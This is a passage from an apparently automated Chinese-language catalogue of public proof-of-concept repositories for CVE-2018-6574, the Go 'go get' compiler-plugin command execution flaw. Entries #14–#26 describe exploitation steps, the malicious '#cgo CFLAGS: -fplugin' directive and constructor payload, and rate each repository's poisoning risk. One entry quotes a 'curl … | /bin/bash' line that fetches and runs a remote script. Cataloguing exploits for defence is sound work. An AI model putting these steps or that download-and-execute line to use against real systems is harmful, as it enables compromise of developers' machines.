1.  攻击者创建一个包含恶意插件的 Go 包（例如，`attack.c` 编译后的 `attack.so`）。
2.  攻击者创建一个 `main.go` 文件，其中使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令加载恶意插件。
3.  攻击者将该 Go 包托管在一个公开可访问的 Git 仓库或其他代码托管平台。
4.  攻击者诱骗受害者使用 `go get` 命令获取并构建该恶意 Go 包。
5.  当受害者执行 `go get` 命令时，Go 编译器将加载并执行恶意插件，从而执行攻击者预先设定的命令。

**项目地址:** [faiqu3/cve-2018-6574](https://github.com/faiqu3/cve-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #14

**来源**: [CVE-2018-6574-faqihudin13_CVE-2018-6574.md](../2018/CVE-2018-6574-faqihudin13_CVE-2018-6574.md)

## CVE-2018-6574-Go-远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Go < 1.8.7, Go 1.9.x < 1.9.4, Go 1.10 pre-releases < Go 1.10rc2

**利用条件:** 用户使用受影响的Go版本执行`go get`命令获取恶意代码仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许攻击者通过控制`go get`获取的代码仓库，利用gcc/clang插件机制注入恶意代码，从而在编译时执行任意命令。 

**漏洞利用方式：**

1.  攻击者创建一个包含恶意代码的Go项目，该项目包含一个C文件 (`attack.c`) 和一个Go文件 (`main.go`)。
2.  `attack.c` 文件包含在编译时执行任意命令的代码。在这个例子中，它执行 `/usr/local/bin/score 9d8dad5f-cda0-45bd-b004-219ca9c1774c`。这个命令可能用于漏洞评分或执行恶意操作。
3.  `main.go` 文件使用 `// #cgo CFLAGS: -fplugin=./attack.so` 注释指示 `go` 编译器使用 `attack.c` 生成的插件。 这会强制 `go` 在构建过程中加载并执行该插件。
4.  当用户使用易受攻击的 Go 版本运行 `go get <attacker_repo>`时，`go` 命令会自动下载并构建恶意项目。
5.  由于 `-fplugin` 标志未被正确过滤，`go` 编译器将加载并执行恶意插件，从而在用户的系统上执行攻击者指定的任意命令。

**有效性评估：**

提供的PoC代码有效，它演示了如何在 `go get` 命令执行期间利用 gcc/clang 插件功能执行任意命令。

**投毒风险评估：**

在此特定仓库中，未发现明显的投毒代码。`attack.c` 中执行的命令 `/usr/local/bin/score 9d8dad5f-cda0-45bd-b004-219ca9c1774c` 本身就是漏洞验证的一部分，旨在证明可以执行任意命令。没有迹象表明作者试图隐藏其他恶意代码或功能。因此，投毒风险评估为 0%。

**总结：**

该漏洞利用了 `go get` 命令在处理 gcc/clang 插件参数时的不当输入验证。攻击者可以通过创建一个包含恶意插件的Go项目来利用此漏洞，当用户使用易受攻击的Go版本获取并构建该项目时，该插件将被加载并执行，从而导致远程命令执行。

**项目地址:** [faqihudin13/CVE-2018-6574](https://github.com/faqihudin13/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #15

**来源**: [CVE-2018-6574-frozenkp_CVE-2018-6574.md](../2018/CVE-2018-6574-frozenkp_CVE-2018-6574.md)

## CVE-2018-6574-go-get远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 需要目标机器安装受影响版本的Go，且执行`go get`命令

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-6574 允许攻击者在受害者构建源代码时执行远程命令。漏洞原因是 `go get` 命令没有正确过滤 gcc 或 clang 插件的参数 `-fplugin=` 和 `-plugin=`。攻击者可以通过构造包含恶意插件选项的 Go 项目，诱导受害者使用 `go get` 命令获取并构建该项目，从而执行任意命令。

**有效性：**

根据漏洞描述和提供的POC代码，漏洞利用的有效性较高。POC代码通过 `#cgo` 指令设置编译选项，利用 `-fplugin` 选项加载恶意的动态链接库，从而在编译时执行预定义的命令。根据`pentesterlab.com/exercises/cve-2018-6574`中的描述，攻击者可以诱骗用户安装恶意包从而执行代码。

**投毒风险：**

该仓库中存在一定的投毒风险，但风险较低。`README.md` 中说明了漏洞利用方式，并明确表示仅用于评估目的。虽然包含了一个`curl`命令，但该命令相对简单，易于检测，攻击者可能通过其他方式进行恶意行为，例如植入更隐蔽的后门程序。该curl命令从外部源获取并执行脚本，存在被篡改的可能。综合考虑，投毒风险大约为10%。

**利用方式：**

1.  攻击者创建一个包含恶意代码的Go项目，该项目使用`#cgo`指令，在编译选项中包含`-fplugin=`或`-plugin=`，指向一个包含恶意代码的动态链接库（如 `calc.so` 或 `calc_darwin.so`）。
2.  攻击者将该项目托管在一个公开的Git仓库中。
3.  攻击者诱导受害者使用受影响版本的Go执行`go get <攻击者仓库地址>`命令。
4.  当`go get`命令构建项目时，会执行恶意动态链接库中的代码，从而实现远程命令执行。
5.  POC中，`calc_darwin.so`（或者其他平台的 `.so` 文件）被设计为执行 `curl newton.cycarrier:8002 | /bin/bash`，这意味着它会从攻击者的服务器下载并执行一个Shell脚本。

**项目地址:** [frozenkp/CVE-2018-6574](https://github.com/frozenkp/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #16

**来源**: [CVE-2018-6574-hasharmujahid_CVE-2018-6574-go-get-RCE.md](../2018/CVE-2018-6574-hasharmujahid_CVE-2018-6574-go-get-RCE.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，允许远程代码执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 受害者使用存在漏洞的Go版本，并使用`go get`命令获取恶意代码仓库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574漏洞允许攻击者在受害者的系统上执行任意命令。攻击者可以通过创建一个包含恶意代码的Go包来实现这一点。当受害者使用`go get`命令获取并构建该包时，恶意代码将被执行。漏洞利用方式如下：

1.  **利用方式:**
    *   攻击者创建一个包含恶意`attack.c`和`main.go`文件的Go包。
    *   `attack.c` 文件包含在编译时执行系统命令的代码，例如，调用 `system("/usr/local/bin/score 173b6b3c-5d6a-4237-b67f-e97ff771ae51")`。
    *   `main.go` 文件使用 `// #cgo CFLAGS: -fplugin=./attack.so` 指令，指示 `go build` 使用 `attack.so` 作为 gcc 插件。这允许攻击者在构建过程中执行 `attack.c` 中的代码。
    *   攻击者将此Go包托管在公共代码仓库（例如GitHub）上。
    *   攻击者诱骗受害者使用 `go get` 命令获取并构建该恶意包。例如：`go get github.com/attacker/malicious_package`。
    *   当受害者执行 `go get` 命令时，`attack.c` 中的恶意代码将被执行，从而允许攻击者在受害者的系统上执行任意命令。

2.  **有效性:**
    *   提供的PoC代码有效。`attack.c`文件编译为共享库，并通过`main.go`中的`cgo`指令在构建时加载执行，从而实现远程命令执行。

3.  **投毒风险:**
    *   此仓库中未发现作者隐藏的投毒代码。该PoC的目的是演示漏洞利用，而不是在正常功能之外执行恶意行为。`attack.c` 中执行的 `system` 命令可以被修改为任何攻击者想要执行的命令，但目前的代码仅调用了一个看起来是用于获取分数的命令 `score`。 投毒风险为0%。

**项目地址:** [hasharmujahid/CVE-2018-6574-go-get-RCE](https://github.com/hasharmujahid/CVE-2018-6574-go-get-RCE)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #17

**来源**: [CVE-2018-6574-iNoSec2_cve-2018-6574.md](../2018/CVE-2018-6574-iNoSec2_cve-2018-6574.md)

## CVE-2018-6574

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程代码执行

**影响应用:** Go

**危害等级:** 高危，可能导致任意代码执行

**影响版本:** Go < 1.8.7, Go 1.9.x < 1.9.4, Go 1.10 pre-releases < Go 1.10rc2

**利用条件:** 用户使用go get命令获取包含恶意代码的包

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许攻击者在受害者使用 `go get` 命令获取恶意 Go 包时执行任意代码。该漏洞的根源在于 `go get` 命令在构建过程中没有正确过滤 gcc/clang 的插件参数，导致攻击者可以通过 `-fplugin=` 或 `-plugin=` 参数指定恶意插件，从而执行任意代码。

**有效性：**

提供的 POC 代码是有效的，它通过创建一个包含恶意 C 代码（`2018.c`）的 Go 包来实现远程代码执行。恶意 C 代码使用 `__attribute__((constructor))` 在库加载时自动执行 `malicious()` 函数，该函数执行 `/usr/local/bin/score 0634e7ff-26c1-4d5e-817e-a214be2151b7` 命令。 `main.go` 文件使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令告诉 Go 编译器在构建时加载 `attack.so` 插件（通过编译 `2018.c` 得到）。

**投毒风险：**

该POC代码本身就是一个漏洞演示，旨在展示如何利用该漏洞执行任意命令。`2018.c` 中执行的 `/usr/local/bin/score 0634e7ff-26c1-4d5e-817e-a214be2151b7` 命令是预期的payload。该代码仓库的目的是演示漏洞，而不是为了植入后门。因此投毒风险评估为0%。

**利用方式：**

1.  **创建恶意Go包:** 攻击者创建一个包含恶意 C 代码和 Go 代码的 Go 包。恶意 C 代码编译成一个共享库（`attack.so`）。
2.  **上传恶意Go包:** 攻击者将恶意 Go 包上传到公共代码托管平台（如 GitHub）。
3.  **诱骗受害者:** 攻击者诱骗受害者使用 `go get` 命令获取恶意 Go 包。
4.  **执行恶意代码:** 当受害者使用 `go get` 命令获取恶意 Go 包时，Go 编译器会加载恶意共享库，并执行其中的恶意代码。

**缓解措施：**

*   升级 Go 版本到受影响版本之外（>= 1.8.7, >= 1.9.4, >= 1.10rc2）。
*   避免使用来自不受信任来源的 Go 包。


**项目地址:** [iNoSec2/cve-2018-6574](https://github.com/iNoSec2/cve-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #18

**来源**: [CVE-2018-6574-jahwni_CVE-2018-6574.md](../2018/CVE-2018-6574-jahwni_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 受害者使用存在漏洞的Go版本执行 `go get` 命令来获取包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许通过 `go get` 命令执行远程代码。攻击者可以创建一个包含恶意代码的Go包，并将该包托管在公开的存储库中。当受害者使用 `go get` 命令获取该包时，恶意代码将在构建过程中执行。利用方式为在包中利用 gcc 或 clang 的插件功能（`-fplugin=` 或 `-plugin=` 参数），在编译时执行任意命令。

提供的PoC代码包含两个文件：`attack.c` 和 `main.go`。
*   `attack.c` 文件包含一个名为 `malicious` 的函数，该函数使用 `system` 函数执行命令 `/usr/local/bin/score 356f5d20-43e8-4a8c-b024-f1e42ec7f7f5`。`__attribute__((constructor))` 确保 `malicious` 函数在共享库加载时自动执行。
*   `main.go` 文件使用 cgo 特性。`// #cgo CFLAGS: -fplugin=./attack.so`  指示 `go` 编译器在构建过程中将 `attack.so` 作为 gcc/clang 插件加载。由于 `attack.so` 包含 `malicious` 函数，因此当 `go get` 获取并构建这个包时，`malicious` 函数将被执行，从而实现远程命令执行。

有效性：提供的PoC代码是有效的，如果目标Go版本存在漏洞，则可以成功执行任意命令。

投毒风险：提供的 PoC 仅仅是漏洞演示，执行了一个固定的命令。从提供的 `attack.c` 和 `main.go` 代码来看，并没有发现隐藏的、额外的恶意代码或者后门。作者意图是演示漏洞，而不是进行恶意攻击，风险较低。

利用方式：
1.  攻击者创建一个包含恶意代码的Go包，如提供的PoC代码。
2.  攻击者将该包托管在公开的存储库中。
3.  攻击者诱使受害者使用存在漏洞的Go版本执行 `go get <attacker_repo>` 命令来获取该包。
4.  当受害者执行 `go get` 命令时，恶意代码将在构建过程中执行，从而实现远程命令执行。

**项目地址:** [jahwni/CVE-2018-6574](https://github.com/jahwni/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #19

**来源**: [CVE-2018-6574-jftierno_-CVE-2018-6574.md](../2018/CVE-2018-6574-jftierno_-CVE-2018-6574.md)

## CVE-2018-6574

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程代码执行

**影响应用:** Go

**危害等级:** 高危，可能导致完全控制受影响的系统

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 受害者使用存在漏洞的 Go 版本，并且运行 `go get` 获取恶意代码。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许攻击者通过 `go get` 命令执行远程代码。具体利用方式如下：

1.  **攻击者创建恶意 Go 包：** 攻击者创建一个包含恶意代码的 Go 包，利用 gcc 或 clang 插件特性。 在提供的POC代码中,attack.c 文件定义了一个 `malicious()` 函数，该函数被声明为 `__attribute__((constructor))`，这意味着它会在程序加载时自动执行。该函数会执行 `system("/usr/local/bin/score a321915f-37a6-465f-be95-ce9602f6a9e1")` 命令。这表明攻击者试图执行一个特定的程序 `/usr/local/bin/score`，并传递一个特定的ID作为参数。

2.  **诱导受害者获取恶意包：** 攻击者诱导受害者使用 `go get` 命令获取该恶意包。这可以通过多种方式实现，例如通过社会工程学攻击，或者将恶意包伪装成有用的工具库。

3.  **构建时执行恶意代码：** 当受害者使用 `go get` 命令获取并构建恶意包时，Go 会调用 gcc 或 clang 来编译代码。由于存在漏洞，Go 没有正确地过滤 `-fplugin=` 和 `-plugin=` 参数，导致 gcc 或 clang 加载并执行攻击者提供的恶意插件，从而执行攻击者预先设定的恶意代码。

**有效性分析：**
提供的POC代码通过构造一个包含constructor属性的C代码，在编译时自动执行恶意命令`/usr/local/bin/score a321915f-37a6-465f-be95-ce9602f6a9e1`。如果攻击者能够控制 go get 获取的源码，并在其中包含类似的代码，那么这个POC是有效的。

**投毒风险分析：**
提供的POC代码本身没有明显的投毒行为，它只是简单地执行一个命令。是否包含投毒代码需要分析 go get 获取的整个代码仓库，而不仅仅是 attack.c 这个文件。根据目前的信息，无法确定是否存在投毒风险。
提供的 attack.c 代码直接执行预设的命令，没有发现隐藏恶意行为的迹象。假设作者仅提供了已验证可复现漏洞的代码，所以判定投毒风险为0%

**利用方式总结：**
攻击者利用该漏洞，主要是利用了`go get`命令在构建过程中的不安全行为，通过`gcc`或`clang`的插件机制执行恶意代码，达到远程代码执行的目的。攻击的关键在于诱使受害者获取并构建包含恶意插件的Go包。

**项目地址:** [jftierno/-CVE-2018-6574](https://github.com/jftierno/-CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #20

**来源**: [CVE-2018-6574-jftierno_CVE-2018-6574-2.md](../2018/CVE-2018-6574-jftierno_CVE-2018-6574-2.md)

## CVE-2018-6574-Go-远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** < 1.8.7, 1.9.x < 1.9.4, 1.10 pre-releases < 1.10rc2

**利用条件:** 用户使用受影响的Go版本执行 `go get` 命令，并下载包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-6574 允许攻击者通过 `go get` 命令执行远程代码。漏洞原因是 Go 在构建过程中没有正确过滤 gcc 或 clang 的插件参数（`-fplugin=` 和 `-plugin=`）。

**有效性：**

提供的 POC 代码 `main.go` 展示了如何利用该漏洞。代码通过 `#cgo CFLAGS: -fplugin=./attack.so` 指令引入一个恶意的 gcc 插件 `attack.so`。当 `go get` 或 `go build` 执行此代码时，gcc/clang 会尝试加载并执行 `attack.so`，从而实现远程命令执行。

**投毒风险：**

由于 POC 代码中引用了外部的 `attack.so` 文件，因此存在投毒风险。虽然代码本身只是声明和调用了一个简单的函数，但是实际的恶意代码存在于 `attack.so` 中。攻击者可以将恶意代码注入到 `attack.so` 中，从而在用户构建项目时执行任意命令。如果用户下载并使用了包含此 `main.go` 和恶意的 `attack.so` 的代码仓库，那么就会受到攻击。投毒风险评估为10%，主要因为代码本身依赖外部文件，增加了复杂性，也更容易被发现。

**利用方式：**

1.  攻击者创建一个包含恶意 `main.go` 和 `attack.so` 的 Go 项目。
2.  `main.go` 包含 `#cgo CFLAGS: -fplugin=./attack.so` 指令。
3.  `attack.so` 包含攻击者想要执行的恶意代码。
4.  攻击者将该项目托管在公共代码仓库（例如 GitHub）上。
5.  攻击者诱骗受害者使用受影响的 Go 版本执行 `go get <攻击者仓库地址>` 命令。
6.  `go get` 命令下载并构建项目，触发 gcc/clang 加载 `attack.so`。
7.  `attack.so` 中的恶意代码被执行，攻击成功。

搜索引擎结果中的 "pentesterlab.com/exercises/cve-2018-6574" 链接提供了一个练习环境，可以用来复现和理解该漏洞。

**总结：**

CVE-2018-6574 是一个严重的安全漏洞，允许攻击者利用 `go get` 命令执行任意代码。为了避免受到攻击，请确保使用最新版本的 Go，并避免下载和构建来自不可信来源的 Go 项目。

**项目地址:** [jftierno/CVE-2018-6574-2](https://github.com/jftierno/CVE-2018-6574-2)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #21

**来源**: [CVE-2018-6574-jftierno_CVE-2018-6574.md](../2018/CVE-2018-6574-jftierno_CVE-2018-6574.md)

## CVE-2018-6574-Go-远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标机器需要安装受影响版本的Go，并且执行`go get`命令拉取恶意代码仓库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-6574漏洞允许攻击者在`go get`命令执行期间，通过gcc或clang插件功能执行任意命令。攻击者可以创建一个包含恶意C代码的Go项目，该C代码在编译时被执行。 

**漏洞利用方式：**
1.  攻击者创建一个包含`attack.c`和`main.go`的恶意Go项目。
2.  `attack.c`包含将在编译时执行的恶意代码，例如，利用`system`函数执行任意命令。
3.  `main.go`使用`// #cgo CFLAGS: -fplugin=./attack.so`指示Go编译器使用`attack.so`作为gcc/clang插件。
4.  当用户使用`go get`命令下载并构建该恶意项目时，`attack.c`会被编译成`attack.so`，并作为插件加载，其中的恶意代码将被执行。

**有效性：**
提供的PoC代码是有效的。`attack.c`中的`malicious()`函数使用`system()`函数执行命令`/usr/local/bin/score a321915f-37a6-465f-be95-ce9602f6a9e1`。`main.go`中的`// #cgo CFLAGS: -fplugin=./attack.so`指令使得在构建时加载`attack.so`，从而执行恶意代码。

**投毒风险：**
存在一定的投毒风险，风险占比约10%。虽然PoC的主要功能是演示漏洞利用，但攻击者可能在`attack.c`中添加额外的恶意代码，例如，植入后门、窃取敏感信息等。当前的PoC代码中`/usr/local/bin/score a321915f-37a6-465f-be95-ce9602f6a9e1` 命令比较可疑，如果`score` 命令的功能未知，那么存在潜在的风险。 此外攻击者可能在其他地方加入隐蔽的后门代码，增加了投毒的风险，所以评估投毒风险占比为10%。

**项目地址:** [jftierno/CVE-2018-6574](https://github.com/jftierno/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #22

**来源**: [CVE-2018-6574-lisu60_cve-2018-6574.md](../2018/CVE-2018-6574-lisu60_cve-2018-6574.md)

## CVE-2018-6574-go get 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致系统被完全控制

**影响版本:** < 1.8.7, 1.9.x < 1.9.4, 1.10 pre-releases < 1.10rc2

**利用条件:** 目标系统使用受影响的Go版本，且执行了`go get`命令来获取恶意代码仓库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574允许攻击者利用`go get`命令执行任意代码。漏洞原理是由于受影响的Go版本在构建过程中没有正确过滤`-fplugin`和`-plugin`参数，攻击者可以在代码仓库中包含恶意的gcc/clang插件，当用户使用`go get`下载并构建该仓库时，恶意插件会被执行，从而实现远程命令执行。

**有效性分析：**
提供的POC代码是有效的，它演示了如何利用`-fplugin`选项执行代码。`attack.c`文件包含一个`malicious()`函数，该函数使用`system()`调用执行命令`/usr/local/bin/score cacd042c-6b75-4c9b-b52d-3ebb2f52932e`。`attack.go`文件使用`#cgo CFLAGS: -fplugin=./attack.so`指令告诉go编译器在构建过程中包含该恶意插件。

**投毒风险分析：**
代码本身没有明显的投毒迹象。`attack.c`中执行的命令`/usr/local/bin/score cacd042c-6b75-4c9b-b52d-3ebb2f52932e`看起来像是一个示例或者测试命令，用于验证漏洞是否成功利用。虽然这个命令本身可能是无害的，但攻击者可以修改`attack.c`来执行任何他们想要的恶意命令，这才是真正的风险所在。所以说，从提供的代码来看，投毒的概率为0%，但是不代表攻击者不能进行投毒。

**利用方式分析：**
1.  攻击者创建一个包含恶意代码的Go项目，其中包括`attack.c`和`attack.go`文件，以及`go.mod`文件。
2.  攻击者将该项目托管在一个公开的代码仓库中（如GitHub）。
3.  攻击者诱骗目标用户使用`go get`命令下载并构建该项目。
4.  当目标用户执行`go get`命令时，Go编译器会读取`attack.go`文件中的`#cgo CFLAGS: -fplugin=./attack.so`指令，并将`attack.so`插件加载到构建过程中。
5.  `attack.so`插件中的`malicious()`函数会被执行，从而执行攻击者预先设定的恶意命令。

**项目地址:** [lisu60/cve-2018-6574](https://github.com/lisu60/cve-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #23

**来源**: [CVE-2018-6574-markisback_CVE-2018-6574.md](../2018/CVE-2018-6574-markisback_CVE-2018-6574.md)

## CVE-2018-6574 Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标系统使用受影响的 Go 版本，并且执行了 `go get` 命令获取恶意代码。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 漏洞允许在 `go get` 命令构建源代码时执行远程命令。 这是因为 Go 在处理 gcc 或 clang 插件功能时，未正确阻止 `-fplugin=` 和 `-plugin=` 参数。攻击者可以创建一个恶意的 Go 包，其中包含一个 `attack.c` 文件，该文件使用 `__attribute__((constructor))` 定义一个在加载时自动执行的函数 `malicious()`。这个函数会执行任意命令，例如本例中的 `/usr/local/bin/score 9ba57f82-9a67-46fe-885b-682c886cb726`。 `main.go` 文件使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令来编译和链接 `attack.c` 文件生成的动态链接库 `attack.so`。 当用户使用 `go get` 命令获取并构建这个恶意包时，`attack.so` 会被加载，`malicious()` 函数会被自动执行，从而导致远程命令执行。

**有效性：**提供的 POC 代码有效。当目标系统使用存在漏洞的 Go 版本并执行 `go get` 命令时，攻击者可以通过托管包含恶意代码的仓库来利用此漏洞。

**投毒风险：**提供的代码本身就是一个漏洞利用程序，而非被投毒的代码。此仓库没有发现额外的、作者隐藏的投毒代码。 该POC的主要目标是演示漏洞而不是隐藏恶意代码。因此，投毒风险评估为0%。

**利用方式：**
1.  攻击者创建一个包含恶意 `attack.c` 和 `main.go` 文件的 Go 包。
2.  `attack.c` 文件包含一个在加载时自动执行的 `malicious()` 函数，用于执行任意命令。
3.  `main.go` 文件使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令来编译和链接 `attack.so`。
4.  攻击者将恶意 Go 包托管在一个公开可访问的仓库中。
5.  受害者使用 `go get` 命令获取并构建这个恶意包。
6.  在构建过程中，`attack.so` 被加载，`malicious()` 函数被执行，从而导致远程命令执行。

**项目地址:** [markisback/CVE-2018-6574](https://github.com/markisback/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #24

**来源**: [CVE-2018-6574-memmas_CVE-2018-6574.md](../2018/CVE-2018-6574-memmas_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程代码执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标系统需要运行受影响的Go版本，并且执行`go get`命令获取恶意代码仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 漏洞允许攻击者通过 `go get` 命令执行任意代码。该漏洞源于 Go 在构建过程中没有正确过滤 gcc 或 clang 的插件参数（`-fplugin=` 和 `-plugin=`）。攻击者可以构造包含恶意 `C` 代码的 Go 项目，利用 `cgo` 特性，在 `go get` 下载并构建该项目时，`C` 代码会被编译并执行，从而实现远程命令执行。

**有效性：**
提供的 POC 代码有效。它包含一个 `exploit.c` 文件，其中定义了一个 `malicious()` 函数，该函数使用 `system()` 函数执行命令 `/usr/local/bin/score 3f9f4915-ab08-4227-9eba-830c2b3ac417`。`__attribute__((constructor))` 确保 `malicious()` 函数在加载动态链接库时自动执行。
`main.go` 文件使用 `cgo` 特性，将 `exploit.so` 作为插件编译到 Go 程序中。当 `go get` 获取并构建这个项目时，`exploit.c` 会被编译成动态链接库，并在程序加载时执行 `malicious()` 函数，从而执行预定的恶意命令。

**投毒风险：**
根据提供的代码，投毒风险为 0%。`exploit.c` 中执行的命令 `/usr/local/bin/score 3f9f4915-ab08-4227-9eba-830c2b3ac417` 明确定义，没有发现隐藏的恶意代码或者其他未知的行为。此仓库只是作为POC验证，触发执行的是给定的命令。

**利用方式：**
1.  **创建恶意 Go 项目：** 攻击者创建一个包含 `exploit.c` 和 `main.go` 文件的 Go 项目。`exploit.c` 包含要执行的恶意代码，`main.go` 使用 `cgo` 特性加载 `exploit.so`。
2.  **托管恶意项目：** 将恶意 Go 项目托管在公共代码仓库（例如 GitHub）上。
3.  **诱导受害者执行 `go get`：** 攻击者诱导受害者在其系统上执行 `go get <恶意项目URL>` 命令。
4.  **远程命令执行：** 当受害者执行 `go get` 命令时，Go 会下载并构建恶意项目。构建过程中，`exploit.c` 会被编译并执行，从而在受害者系统上执行攻击者预设的恶意命令。

**项目地址:** [memmas/CVE-2018-6574](https://github.com/memmas/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #25

**来源**: [CVE-2018-6574-mux0x_CVE-2018-6574.md](../2018/CVE-2018-6574-mux0x_CVE-2018-6574.md)

## CVE-2018-6574 Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，允许攻击者在构建过程中执行任意代码

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标系统使用受影响的Go版本，并且执行`go get`命令获取恶意代码。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许通过`go get`命令执行远程命令，利用了 gcc/clang 插件功能未正确过滤 `-fplugin=` 和 `-plugin=` 参数。攻击者可以创建一个包含恶意代码的Go项目，并在项目的CGO指令中指定恶意的插件。当受害者使用受影响的Go版本通过`go get`获取并构建该项目时，指定的恶意插件会被执行，从而导致远程命令执行。

分析提供的POC代码：

*   `attack.c`：这是一个 C 源代码文件，定义了一个名为 `exploit` 的函数，该函数使用 `system` 函数执行命令 `/usr/local/bin/score afd78b87-2130-4509-be41-e2bc661c338e`。`__attribute__((constructor))` 使得 `exploit` 函数在共享库加载时自动执行。
*   `main.go`：这是一个 Go 源代码文件，它使用 CGO（C Go 接口）来调用 C 代码。`// #cgo CFLAGS: -fplugin=./attack.so` 指令告诉 Go 编译器在构建过程中使用 `attack.so` 作为 gcc/clang 的插件。`attack.so` 是由 `attack.c` 编译生成的共享库。当 `go get` 构建该项目时，会编译 `attack.c` 生成 `attack.so`，然后将其作为插件加载，从而执行 `exploit` 函数中的命令。

**有效性：**

该POC代码有效。通过 `go get` 命令获取并构建包含上述代码的项目，可以触发远程命令执行。

**投毒风险：**

代码本身的功能是明确的：执行一个特定的命令。**并没有隐藏任何其他的后门代码或者恶意行为**。因此，投毒风险为 0%。

**利用方式：**

1.  攻击者创建一个包含恶意 `attack.c` 和 `main.go` 的 Go 项目。
2.  攻击者将该项目托管在公共代码仓库（如 GitHub）。
3.  攻击者诱导受害者使用受影响的 Go 版本执行 `go get <attacker's repository>` 命令。
4.  受害者的 Go 工具链在构建项目时，会加载 `attack.so` 插件，从而执行攻击者指定的任意命令。

**项目地址:** [mux0x/CVE-2018-6574](https://github.com/mux0x/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #26

**来源**: [CVE-2018-6574-paulogmota_CVE-2018-6574.md](../2018/CVE-2018-6574-paulogmota_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

